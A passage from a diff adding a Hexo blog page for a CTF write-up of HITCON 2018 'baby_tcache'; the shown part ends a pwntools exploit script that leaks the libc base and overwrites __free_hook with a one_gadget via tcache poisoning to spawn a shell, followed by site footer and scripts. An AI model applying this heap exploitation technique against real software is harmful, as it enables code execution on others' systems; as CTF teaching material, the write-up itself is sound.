class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ed8b0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa0</span>, p64(free_hook))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, p64(onegadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#new"><span class="toc-number">2.1.</span> <span class="toc-text">new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">2.2.</span> <span class="toc-text">delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.</span> <span class="toc-text">编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/08/hitcon-2018-baby-tcache/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&text=hitcon_2018_baby_tcache"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&is_video=false&description=hitcon_2018_baby_tcache"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hitcon_2018_baby_tcache&body=Check out this article: http://example.com/2021/10/08/hitcon-2018-baby-tcache/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&name=hitcon_2018_baby_tcache&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&t=hitcon_2018_baby_tcache"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
